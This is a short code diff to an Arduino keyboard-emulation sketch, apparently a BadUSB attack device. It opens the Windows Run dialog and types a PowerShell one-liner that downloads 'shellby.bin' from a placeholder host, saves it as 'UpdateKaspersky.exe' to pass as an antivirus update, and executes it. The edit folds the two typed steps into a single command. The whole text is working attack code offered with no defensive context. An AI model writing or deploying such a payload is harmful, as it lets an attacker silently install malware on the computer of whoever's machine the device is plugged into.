@@ -90,11 +90,8 @@ void setup()
   Keyboard.press('r');
   Keyboard.releaseAll();
   delay(1700);
-  Keyboard.print("powershell");  
-  typeKey(KEY_RETURN);
+  Keyboard.print("powershell $down = New-Object System.Net.WebClient; $url = 'http://xxx.xxx.xxx/shellby.bin'; $file = 'UpdateKaspersky.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");  
   delay(200);
-  Keyboard.print("$down = New-Object System.Net.WebClient; $url = 'http://xxx.xxx.xxx/shellby.bin'; $file = 'UpdateKaspersky.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
-  delay(150);
   typeKey(KEY_RETURN);
   Keyboard.end();
 }
